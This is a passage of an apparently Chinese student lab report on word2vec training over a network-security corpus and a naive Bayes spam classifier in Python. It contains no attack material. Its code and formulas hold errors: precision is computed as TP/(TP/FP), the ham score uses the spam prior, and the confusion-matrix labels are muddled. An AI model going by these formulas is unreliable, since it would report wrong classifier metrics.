class="string">'阿富汗'</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"争端、冲突这两个词的相关程度："</span>)</span><br><span class="line">y1 = model.similarity(<span class="string">"争端"</span>,<span class="string">"冲突"</span>)</span><br><span class="line">print(y1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"输出与“地区”相关度最高的20 个词："</span>)</span><br><span class="line">y2 = model.most_similar(<span class="string">"地区"</span>, topn=<span class="number">20</span>)</span><br><span class="line">print(y2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"法官 总统 部长 北纬 这四个词中最“不合群”的词"</span>)</span><br><span class="line">y4 = model.doesnt_match(<span class="string">"法官 总统 部长 北纬"</span>.split())</span><br><span class="line">print(y4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存模型</span></span><br><span class="line">model.save(<span class="string">"国家.model"</span>)</span><br><span class="line"><span class="comment"># 读取模型</span></span><br><span class="line"><span class="comment"># model_2 = word2vec.Word2Vec.load("国家.model")</span></span><br></pre></td></tr></table></figure>

<p>运行</p>
<p>模型跑成功</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409190406516.png" alt="image-20200409190406516"></p>
<ul>
<li>阿富汗的词向量，一个200维的数：</li>
</ul>
<p>​    <img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192647571.png" alt="image-20200409192647571"></p>
<ul>
<li>争端、冲突这两个词的相关程度：</li>
</ul>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192713430.png" alt="image-20200409192713430"></p>
<ul>
<li>输出与“地区”相关度最高的20 个词：</li>
</ul>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192810184.png" alt="image-20200409192810184"></p>
<ul>
<li>法官 总统 部长 北纬 这四个词中最“不合群”的词</li>
</ul>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192855779.png" alt="image-20200409192855779"></p>
<p>保存模型</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409193001889.png" alt="image-20200409193001889"></p>
<h1 id="实验1-2-自选词典数据语料库"><a href="#实验1-2-自选词典数据语料库" class="headerlink" title="实验1.2-自选词典数据语料库"></a>实验1.2-自选词典数据语料库</h1><h2 id="1-选择词典数据语料库"><a href="#1-选择词典数据语料库" class="headerlink" title="1.选择词典数据语料库"></a>1.选择词典数据语料库</h2><ul>
<li>在词典方面，我用<a href="https://pinyin.sogou.com/dict/" target="_blank" rel="noopener">搜狗的细胞词库</a><ul>
<li>下载网络安全词典，使用<a href="http://tools.bugscaner.com/sceltotxt/" target="_blank" rel="noopener">搜狗细胞词库转txt工具</a></li>
<li><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411180255840.png" alt="image-20200411180255840"></li>
</ul>
</li>
<li>在语料库方面，我选择<a href="http://bcc.blcu.edu.cn/" target="_blank" rel="noopener">BBC语料库</a><ul>
<li>如图，在科技板块，搜索相关关键词</li>
<li><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411180437845.png" alt="image-20200411180437845"></li>
<li>大概搜索了五个关键词（如病毒、蠕虫、网络安全等）。</li>
<li>然后根据其语料集存在的问题，进行数据清洗</li>
</ul>
</li>
</ul>
<p>选择词典数据语料库的结果如下</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411180819848.png" alt="image-20200411180819848"></p>
<h2 id="2-分词"><a href="#2-分词" class="headerlink" title="2.分词"></a>2.分词</h2><p>代码与第一个实验基本一致</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security_cut</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 导入自定义词典</span></span><br><span class="line">    jieba.load_userdict(<span class="string">"security_dict.txt"</span>)</span><br><span class="line">    <span class="comment"># 语料库路径</span></span><br><span class="line">    pathBaidu = <span class="string">"security\\"</span></span><br><span class="line">    <span class="comment"># 分词结果</span></span><br><span class="line">    resName = <span class="string">"Result_Security.txt"</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(resName):</span><br><span class="line">        os.remove(resName)</span><br><span class="line">    result = codecs.open(resName, <span class="string">'w'</span>, <span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> num &lt;= <span class="number">5</span>:  <span class="comment"># 5A 200 其它100</span></span><br><span class="line">        name = <span class="string">"%d"</span> % num   <span class="comment">#文件遍历格式：0001-&gt;0100</span></span><br><span class="line">        fileName = pathBaidu + str(name) + <span class="string">".txt"</span></span><br><span class="line">        source = open(fileName, <span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>)  <span class="comment">#打开文件</span></span><br><span class="line">        line = source.readline()     <span class="comment">#获得line迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> line != <span class="string">""</span>:</span><br><span class="line">            line = line.rstrip(<span class="string">'\n'</span>)  <span class="comment"># 删除string字符串末尾的指定字符</span></span><br><span class="line">            seglist = jieba.cut(line, cut_all=<span class="literal">False</span>)  <span class="comment"># 精确模式</span></span><br><span class="line">            output = <span class="string">' '</span>.join(list(seglist))  <span class="comment"># 空格拼接，将元组转换为列表，元组是括号，列表是方括号</span></span><br><span class="line">            result.write(output + <span class="string">' '</span>)  <span class="comment"># 空格取代换行'\r\n'</span></span><br><span class="line">            line = source.readline()   <span class="comment">#下一line</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'End Security file: '</span> + str(num))  <span class="comment">#line为空，这个文件遍历结束</span></span><br><span class="line">            result.write(<span class="string">'\r\n'</span>)  <span class="comment">#换行'\r\n'</span></span><br><span class="line">            source.close()        <span class="comment">#关闭源</span></span><br><span class="line">        num = num + <span class="number">1</span>  <span class="comment">#下一个文件</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'End Security cut'</span>) <span class="comment"># 结束百度语料库分词</span></span><br><span class="line"><span class="comment"># Run function</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    security_cut()</span><br></pre></td></tr></table></figure>

<h2 id="3-词向量化"><a href="#3-词向量化" class="headerlink" title="3.词向量化"></a>3.词向量化</h2><p>代码与第一个实验基本一致</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This Python file uses the following encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> gensim.models <span class="keyword">import</span> word2vec</span><br><span class="line"><span class="keyword">import</span>  logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化配置</span></span><br><span class="line">logging.basicConfig(format=<span class="string">'%(asctime)s : %(levelname)s : %(message)s'</span>, level=logging.INFO)</span><br><span class="line"><span class="comment"># 加载语料</span></span><br><span class="line">sentences = word2vec.Text8Corpus(<span class="string">"Result_Security.txt"</span>)</span><br><span class="line"><span class="comment"># 训练模型,维度设置为200;</span></span><br><span class="line">model = word2vec.Word2Vec(sentences, size=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"病毒的词向量，一个200维的数："</span>)</span><br><span class="line">print(model[<span class="string">'病毒'</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"病毒、木马这两个词的相关程度："</span>)</span><br><span class="line">y1 = model.similarity(<span class="string">"病毒"</span>,<span class="string">"木马"</span>)</span><br><span class="line">print(y1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"输出与“网络安全”相关度最高的20 个词："</span>)</span><br><span class="line">y2 = model.most_similar(<span class="string">"网络安全"</span>, topn=<span class="number">20</span>)</span><br><span class="line">print(y2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"病毒 木马 诺顿 蠕虫 这四个词中最“不合群”的词"</span>)</span><br><span class="line">y4 = model.doesnt_match(<span class="string">"病毒 木马 诺顿 蠕虫"</span>.split())</span><br><span class="line">print(y4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存模型</span></span><br><span class="line">model.save(<span class="string">"网络安全.model"</span>)</span><br><span class="line"><span class="comment"># 读取模型</span></span><br><span class="line"><span class="comment"># model_2 = word2vec.Word2Vec.load("国家.model")</span></span><br></pre></td></tr></table></figure>

<p>词向量模型训练成功，测试的结果如下</p>
<ul>
<li><p>病毒的词向量，一个200维的数：</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181124453.png" alt="image-20200411181124453"></p>
</li>
<li><p>病毒、木马这两个词的相关程度：0.9492484</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181203044.png" alt="image-20200411181203044"></p>
</li>
<li><p>输出与“网络安全”相关度最高的20 个词：</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181231329.png" alt="image-20200411181231329"></p>
</li>
<li><p>病毒 木马 诺顿 蠕虫 这四个词中最“不合群”的词：诺顿</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181303308.png" alt="image-20200411181303308"></p>
</li>
</ul>
<p>#coding = gbk</p>
<h1 id="实验2-垃圾邮件的分类"><a href="#实验2-垃圾邮件的分类" class="headerlink" title="实验2-垃圾邮件的分类"></a>实验2-垃圾邮件的分类</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="1-文本分类"><a href="#1-文本分类" class="headerlink" title="1.文本分类"></a>1.文本分类</h3><p>文本分类就是在给定的分类体系下,让计算机根据给定文本的内容，将其判</p>
<p>别为事先确定的若干个文本类别中的某一类或某几类的过程。</p>
<p>一般来说，文本分类可以分为一下过程：</p>
<p>（1） 预处理：将原始语料格式化为同一格式，便于后续的统一处理；</p>
<p>（2） 索引：将文档分解为基本处理单元，同时降低后续处理的开销；</p>
<p>（3） 统计：词频统计，项（单词、概念）与分类的相关概率；</p>
<p>（4） 特征抽取：从文档中抽取出反映文档主题的特征；</p>
<p>（5） 分类器：分类器的训练；</p>
<p>（6） 评价：分类器的测试结果分析。</p>
<p>典型的分类算法包括Rocchio算法、朴素贝叶斯分类算法、K-近邻算法、决</p>
<p>策树算法、神经网络算法和支持向量机算法等。 </p>
<h3 id="2-朴素贝叶斯分类算法"><a href="#2-朴素贝叶斯分类算法" class="headerlink" title="2.朴素贝叶斯分类算法"></a>2.朴素贝叶斯分类算法</h3><p>根据贝叶斯定理，利用先验概率和条件概率估算后验概率：</p>
<p>先验概率：事情还没有发生,那么这件事情发生的可能性的大小。</p>
<p>后验概率：事情已经发生,那么这件事情发生的原因是由某个因素引起的可能性的大小。</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416153013132.png" alt="image-20200416153013132"></p>
<p>将该算法代入我们的垃圾邮件分类任务中之后，理论如下：</p>
<h4 id="1-概率计算"><a href="#1-概率计算" class="headerlink" title="(1).概率计算"></a>(1).概率计算</h4><p>假设c0是正常邮件，c1是垃圾邮件。<code>𝑝(𝑐0)</code>表示在邮件数据集中，正常邮件的概率，<code>𝑝(𝑐1)</code>则表示垃圾邮件的概率，所以计数之后除以邮件总数即可。</p>
<p>x与y分别是邮件的两个特征，那么，当邮件有x和y两个特征时（因为两个概率的分母完全一样，因此在比较两者大小时可忽略分母。）</p>
<ul>
<li><p>为正常邮件的概率为<code>𝑝(𝑐0/𝑥, 𝑦) =𝑝(𝑥, 𝑦/c0)*p(c0)</code> </p>
</li>
<li><p>为垃圾邮件的概率为<code>𝑝(𝑐1/𝑥, 𝑦) =𝑝(𝑥, 𝑦/c1)*p(c1)</code> </p>
</li>
</ul>
<h4 id="2-“朴素”——引入条件独立性假设"><a href="#2-“朴素”——引入条件独立性假设" class="headerlink" title="(2).“朴素”——引入条件独立性假设"></a>(2).“朴素”——引入条件独立性假设</h4><p>x和y的条件概率相互独立。𝑝(𝑥/𝑐𝑖)和𝑝(𝑦/𝑐𝑖)可以对数据进行计数而直接得出。</p>
<p>则条件概率<code>𝑝(𝑥, 𝑦/ci)=𝑝(𝑥/c0)*𝑝(𝑦/ci)</code></p>
<p>即上述公式为<code>𝑝(𝑐0/𝑥, 𝑦) =𝑝(𝑥, 𝑦/c0)*𝑝(c0)=𝑝(𝑥/c0)*𝑝(𝑦/ci)*p(c0)</code> </p>
<h4 id="3-假设每个样本至少出现一次"><a href="#3-假设每个样本至少出现一次" class="headerlink" title="(3).假设每个样本至少出现一次"></a>(3).假设每个样本至少出现一次</h4><p>由于条件独立性假设，需要对条件概率进行乘法运算，若某个样本不出现，即概率为0，则最后结果也为0。所以假设每个样本至少出现一次。</p>
<h4 id="4-将全部乘法运算改为log运算"><a href="#4-将全部乘法运算改为log运算" class="headerlink" title="(4).将全部乘法运算改为log运算"></a>(4).将全部乘法运算改为log运算</h4><p>在实际运算中，条件概率可能会很小，即接近于0，那么在乘法运算中很可能会有下溢出的问题。</p>
<h3 id="3-实际的编码流程"><a href="#3-实际的编码流程" class="headerlink" title="3.实际的编码流程"></a>3.实际的编码流程</h3><p>在本实验中，实际的编码时，我们所需要做的事按顺序排列的如下：</p>
<ol>
<li><p>网上选择一些中文常用的停用词。</p>
</li>
<li><p>读入spam（恶意）、ham（正常）邮件，用jieba.cut()分词，并且去除停用词，保存。</p>
</li>
<li><p>用jieba.analyse.extract_tags()分别提取两个文件的前50（或更多）常见词，合成为一个常见词list，作为我们的特征词向量features。</p>
</li>
<li><p>接下来，对spam、ham的分词结果进行特征词向量features的特征计算：</p>
<ol>
<li>对每一封邮件，其特征词向量features全为1</li>
<li>统计其在features中每个词的出现次数</li>
<li>如果features出现一次，该项就加1</li>
</ol>
</li>
<li><p>根据朴素贝叶斯定理计算spam、ham后验概率spam_vec\ham_vec</p>
</li>
<li><p>计算spam、ham各占总邮件数的概率p_spam、p_ham</p>
</li>
<li><p>计算待测试集的特征集向量test_vec</p>
</li>
<li><p>将<code>test_vec*spam_vec*p_spam</code> 与<code>test_vec*ham_vec*p_ham</code>相比，</p>
</li>
<li><p>哪方概率大则该封测试邮件属于哪一类（为了避免正常邮件分为垃圾邮件，当概率相等时，判定为正常）</p>
</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ol>
<li>网上选择一些中文常用的停用词。</li>
</ol>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416161709427.png" alt="image-20200416161709427"></p>
<ol start="2">
<li><p>读入spam（恶意）、ham（正常）邮件，用jieba.cut()分词，并且去除停用词，保存。</p>
</li>
<li><p>用jieba.analyse.extract_tags()分别提取两个文件的前50（或更多）常见词，合成为一个常见词list，作为我们的特征词向量features。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_tags_f</span><span class="params">(origin_file_name, target_file_name,number_of_item)</span>:</span></span><br><span class="line">    stop_word_file = <span class="string">"stop_word_list.txt"</span>  <span class="comment"># 停用词txt</span></span><br><span class="line">    stop_word = list()  <span class="comment"># 停用词数组</span></span><br><span class="line">    target_file = open(target_file_name, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>)  <span class="comment"># 提取保存的文件</span></span><br><span class="line">    <span class="keyword">with</span> open(stop_word_file, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> stop_word_file_object:</span><br><span class="line">        contents = stop_word_file_object.readlines()</span><br><span class="line">        <span class="comment"># print(contents)</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> contents:</span><br><span class="line">            line = line.strip()  <span class="comment"># 移除尾部字符</span></span><br><span class="line">            stop_word.append(line)</span><br><span class="line">    <span class="comment"># print(stop_word)</span></span><br><span class="line">    origin_file = origin_file_name <span class="comment">#对文件进行逐行遍历分词</span></span><br><span class="line">    s = <span class="string">""</span> <span class="comment">#没有停顿词的文件中每一行的词串</span></span><br><span class="line">    <span class="keyword">with</span> open(origin_file, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> origin_file_obejct:</span><br><span class="line">        contents = origin_file_obejct.readlines() <span class="comment">#读取</span></span><br><span class="line">        <span class="comment"># print(contents)</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> contents:</span><br><span class="line">            line = line.strip() <span class="comment">#将line去除尾部回车换行</span></span><br><span class="line">            out_line = <span class="string">""</span> <span class="comment">#处理后的line</span></span><br><span class="line">            word_list = jieba.cut(line, cut_all=<span class="literal">True</span>) <span class="comment">#分词成list</span></span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> word_list:  <span class="comment">#将list以空格间隔合并</span></span><br><span class="line">                <span class="keyword">if</span> (word <span class="keyword">not</span> <span class="keyword">in</span> stop_word) <span class="keyword">and</span> (word != <span class="string">"\t"</span>): <span class="comment">#去除停用词</span></span><br><span class="line">                    out_line = out_line + word + <span class="string">" "</span></span><br><span class="line">            s = s + out_line <span class="comment">#没有停顿词的文件中每一行的词串</span></span><br><span class="line">            target_file.write(out_line.strip() + <span class="string">"\n"</span>) <span class="comment">#保存分词文件</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    features = jieba.analyse.extract_tags(s, number_of_item) <span class="comment">#将分词特征提取</span></span><br><span class="line">    <span class="comment"># print(features)</span></span><br><span class="line">    <span class="comment"># print(len(features))</span></span><br><span class="line">    <span class="keyword">return</span> features</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>接下来，对spam、ham的分词结果进行特征词向量features的特征计算：<ol>
<li>对每一封邮件，其特征词向量features全为1</li>
<li>统计其在features中每个词的出现次数</li>
<li>如果features出现一次，该项就加1</li>
</ol>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_vec</span><span class="params">(ham,spam,features)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(ham, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        ham_lines = f1.readlines()</span><br><span class="line">    <span class="keyword">with</span> open(spam, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        spam_lines = f1.readlines()</span><br><span class="line">    list_sum=np.zeros((<span class="number">200</span>,len(features))) <span class="comment">#所有特征词向量，前100为正常邮件，后100为垃圾邮件</span></span><br><span class="line">    list_sum_i=<span class="number">0</span>    <span class="comment">#所有特征词向量的赋值下标i</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ham_lines: <span class="comment">#计算每封正常邮件特征词向量</span></span><br><span class="line">        list_ham = np.ones(len(features)) <span class="comment">#对每一封邮件，其特征词向量features全为1</span></span><br><span class="line">        line = i.split(<span class="string">' '</span>) <span class="comment">#按空格split成一个邮件词list</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(features)): <span class="comment">#对于features中每个词</span></span><br><span class="line">            <span class="keyword">for</span> line_feature <span class="keyword">in</span> line : <span class="comment">#统计邮件中每个词的出现次数</span></span><br><span class="line">                <span class="keyword">if</span> features[j] == line_feature: <span class="comment">#如果features出现一次，该项就加1</span></span><br><span class="line">                    <span class="comment"># print("get")</span></span><br><span class="line">                    list_ham[j]=list_ham[j]+<span class="number">1</span></span><br><span class="line">        list_sum[list_sum_i]=list_ham <span class="comment">#将该封邮件词向量复制给所有特征词向量</span></span><br><span class="line">        list_sum_i +=<span class="number">1</span></span><br><span class="line">    <span class="comment"># print("——————————————————————————————————————————————————————")</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> spam_lines: <span class="comment">#计算垃圾邮件特征词向量</span></span><br><span class="line">        list_spam = np.ones(len(features))</span><br><span class="line">        line = i.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(features)):</span><br><span class="line">            <span class="keyword">for</span> line_feature <span class="keyword">in</span> line :</span><br><span class="line">                <span class="keyword">if</span> features[j] == line_feature:</span><br><span class="line">                    <span class="comment"># print("get")</span></span><br><span class="line">                    list_spam[j]=list_spam[j]+<span class="number">1</span></span><br><span class="line">        list_sum[list_sum_i]=list_spam</span><br><span class="line">        list_sum_i +=<span class="number">1</span></span><br><span class="line">    cate1=[<span class="number">0</span>]*<span class="number">100</span>  <span class="comment">#前面100封邮件正常，后面100封邮件垃圾</span></span><br><span class="line">    cate2=[<span class="number">1</span>]*<span class="number">100</span></span><br><span class="line">    cate=cate1+cate2 <span class="comment">#cate为邮件的类别lsit</span></span><br><span class="line">    <span class="keyword">return</span> list_sum,cate</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>根据朴素贝叶斯定理计算spam、ham后验概率spam_vec\ham_vec</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traing_bayes</span><span class="params">(trainMatrix, trainCategory)</span>:</span>  <span class="comment"># trainMatrix为所有邮件的矩阵表示，trainCategory为表示邮件类别的向量</span></span><br><span class="line">    <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">    numTrainDocs = len(trainMatrix)  <span class="comment"># 邮件总数量</span></span><br><span class="line">    numWords = len(trainMatrix[<span class="number">0</span>])  <span class="comment"># 词典长度</span></span><br><span class="line">    pSpam = sum(trainCategory) / float(numTrainDocs)  <span class="comment"># 统计垃圾邮件的总个数，然后除以总文档个数（先验概率）</span></span><br><span class="line">    p0Num = np.ones(numWords)  <span class="comment"># 将向量初始化为1，表示每个词至少出现1次</span></span><br><span class="line">    p1Num = np.ones(numWords)  <span class="comment"># 同上</span></span><br><span class="line">    p0Denom = <span class="number">2.0</span></span><br><span class="line">    p1Denom = <span class="number">2.0</span>  <span class="comment"># 分母初始化为2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numTrainDocs):</span><br><span class="line">        <span class="keyword">if</span> trainCategory[i] == <span class="number">1</span>:  <span class="comment"># 如果是垃圾邮件</span></span><br><span class="line">            p1Num += trainMatrix[i]  <span class="comment"># 把属于同一类的文本向量相加，实质是统计某个词条在该类文本中出现频率</span></span><br><span class="line">            p1Denom += sum(trainMatrix[i])  <span class="comment"># 把垃圾邮件向量的所有元素加起来，表示垃圾邮件中的所有词汇</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p0Num += trainMatrix[i]</span><br><span class="line">            p0Denom += sum(trainMatrix[i])</span><br><span class="line">    p1 = np.log(p1Num / p1Denom)  <span class="comment"># 统计词典中所有词条在垃圾邮件中出现的概率</span></span><br><span class="line">    p0 = np.log(p0Num / p0Denom)  <span class="comment"># 统计词典中所有词条在正常文邮件中出现的概率</span></span><br><span class="line">    <span class="keyword">return</span> p0,p1,pSpam</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>计算spam、ham各占总邮件数的概率p_spam、p_ham</li>
<li>计算待测试集的特征集向量test_vec</li>
<li>将<code>test_vec*spam_vec*p_spam</code> 与<code>test_vec*ham_vec*p_ham</code>相比</li>
<li>哪方概率大则该封测试邮件属于哪一类（为了避免正常邮件分为垃圾邮件，当概率相等时，判定为正常）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_classify</span><span class="params">(test,features,ham_vec,spam_vec,p_spam)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(test, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        test_lines = f1.readlines()</span><br><span class="line">    line_i=<span class="number">1</span> <span class="comment">#用于判断计算到了第几封test，test集中，前50为正常，后50为垃圾</span></span><br><span class="line">    TP=<span class="number">0</span> <span class="comment">#正确肯定</span></span><br><span class="line">    TN=<span class="number">0</span> <span class="comment">#正确否定</span></span><br><span class="line">    FP=<span class="number">0</span> <span class="comment">#错误肯定</span></span><br><span class="line">    FN=<span class="number">0</span> <span class="comment">#错误否定</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test_lines: <span class="comment">#计算test集邮件的词向量，并且判断正常\垃圾</span></span><br><span class="line">        test_vec = np.zeros(len(features))</span><br><span class="line">        line = i.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(features)):</span><br><span class="line">            <span class="keyword">for</span> line_feature <span class="keyword">in</span> line :</span><br><span class="line">                <span class="keyword">if</span> features[j] == line_feature:</span><br><span class="line">                    test_vec[j]=test_vec[j]+<span class="number">1</span></span><br><span class="line">        pnorm=sum(test_vec*ham_vec*p_spam)</span><br><span class="line">        pabu=sum(test_vec*spam_vec*p_spam)</span><br><span class="line">        <span class="comment"># if (line_i == 47):</span></span><br><span class="line">        <span class="comment">#     print(test_vec)</span></span><br><span class="line">        <span class="comment"># if(line_i==51): #如果开始判断垃圾邮件就分下行</span></span><br><span class="line">            <span class="comment"># print("————————————————————————————————————————")</span></span><br><span class="line">        <span class="keyword">if</span> pnorm&gt;=pabu : <span class="comment">#正常概率大（ps:当概率相等时，判定为正常)</span></span><br><span class="line">            <span class="keyword">if</span> line_i&gt;<span class="number">50</span> :</span><br><span class="line">                <span class="comment"># print("第%d封邮件是正常邮件" % line_i, end='')</span></span><br><span class="line">                <span class="comment"># print("————判断错误！————"+"其实是垃圾邮件哒!",end='')</span></span><br><span class="line">                FP=FP+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print("第%d封邮件是正常邮件" % line_i, end='')</span></span><br><span class="line">                TP =TP+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> line_i &lt; <span class="number">51</span>:</span><br><span class="line">                <span class="comment"># print("————判断错误！————" + "其实是正常邮件哒",end='')</span></span><br><span class="line">                TN=TN+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print("第%d封邮件是错误邮件" % line_i, end='')</span></span><br><span class="line">                FN=FN+<span class="number">1</span></span><br><span class="line">        <span class="comment"># print("   正常概率VS错误概率：",end='')</span></span><br><span class="line">        <span class="comment"># print(pnorm,pabu)</span></span><br><span class="line">        line_i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"featuears项数："</span>,len(features))</span><br><span class="line">    print(<span class="string">"正确肯定：预测为真，实际为真"</span>,TP)</span><br><span class="line">    print(<span class="string">"正确否定：预测为假，实际为真"</span>,TN)</span><br><span class="line">    print(<span class="string">"错误肯定：预测为真，实际为假"</span>,FP)</span><br><span class="line">    print(<span class="string">"错误否定：预测为假，实际为假"</span>,FN)</span><br><span class="line">    P=TP/(TP/FP) <span class="comment">#查准率</span></span><br><span class="line">    R=TP/(TP+FN) <span class="comment">#查全率</span></span><br><span class="line">    ACC=(TP+FN)/(TP+TN+FP+FN)</span><br><span class="line">    F = <span class="number">2</span>*TP / (<span class="number">2</span>*TP+FP+FN)</span><br><span class="line">    print(<span class="string">"查准率P=TP/（TP+FP）:"</span>,P)</span><br><span class="line">    print(<span class="string">"查全率R=TP/（TP+FN）:"</span>,R)</span><br><span class="line">    print(<span class="string">"准确率ACC=(TP+FN) / (TP+TN+FP+FN):"</span>,ACC)</span><br><span class="line">    print(<span class="string">"调和均值F= 2TP / (2TP+FP+FN):"</span>,F)</span><br></pre></td></tr></table></figure>

<p>main函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    number_of_item=[<span class="number">10</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>,<span class="number">150</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">500</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> number_of_item:</span><br><span class="line">        print(<span class="string">"————————————————————————————————————————"</span>)</span><br><span class="line">        print(<span class="string">"特征项数为："</span>,i)</span><br><span class="line">        extract_tags_f(<span class="string">"test.utf8"</span>, <span class="string">"test_word.txt"</span>,i)  </span><br><span class="line">        <span class="comment">#对测试集分词</span></span><br><span class="line">        features = extract_tags_f(<span class="string">"ham_100.utf8"</span>, <span class="string">"ham_word.txt"</span>,i) </span><br><span class="line">        <span class="comment">#对正常邮件分词，并提取词向量</span></span><br><span class="line">        features += extract_tags_f(<span class="string">"spam_100.utf8"</span>, <span class="string">"spam_word.txt"</span>,i) </span><br><span class="line">        <span class="comment">#垃圾邮件分词，并提取词向量</span></span><br><span class="line">        duplicated = set()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(features)):</span><br><span class="line">            <span class="keyword">if</span> features[i] <span class="keyword">in</span> features[i+<span class="number">1</span>:]:</span><br><span class="line">                duplicated.add(features[i]) </span><br><span class="line">                <span class="comment">#寻找垃圾邮件和正常邮件重复的特征词</span></span><br><span class="line">        <span class="comment"># print(duplicated)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(features) - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> features[i] <span class="keyword">in</span> duplicated:</span><br><span class="line">                features.remove(features[i]) </span><br><span class="line">                <span class="comment">#去除垃圾邮件和正常邮件重复的特征词，但是感觉效果并不好</span></span><br><span class="line">        <span class="comment"># print(features)</span></span><br><span class="line">        print(<span class="string">"去除重复词后特征项数为："</span>,len(features))</span><br><span class="line">        list_sum,cate=calc_vec(<span class="string">"ham_word.txt"</span>,<span class="string">"spam_word.txt"</span>,features) <span 